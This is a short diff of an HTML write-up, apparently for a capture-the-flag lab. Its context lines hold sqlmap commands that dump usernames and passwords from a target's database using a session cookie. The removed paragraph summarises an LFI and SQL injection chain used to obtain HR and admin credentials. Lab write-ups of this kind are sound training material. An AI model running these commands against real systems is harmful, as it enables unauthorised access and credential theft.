@@ -498,8 +498,6 @@ sqlmap -u "http://TARGET_IP/dashboard.php?search=Bob" --cookie="PHPSESSID=[sessi
 sqlmap -u "http://TARGET_IP/dashboard.php?search=Bob" --cookie="PHPSESSID=[session_id]" -p search --batch -D recruit_db -T users -C id,username,password --dump
 # Admin credentials in plaintext -> login as admin -> admin flag</code></pre>
 
-<p>Nmap surfaces PHPSESSID httponly flag not set and key subdirectories. LFI confirmed via file:// scheme. mail.log reveals HR credential location. file://config.php returns HR_PASSWORD directly. SQL injection in dashboard search confirmed via error-based detection, enumerated and dumped via SQLMap. Admin credentials stored in plaintext.</p>
-
   </div>
   <footer class="post-footer"></footer>
 </article>
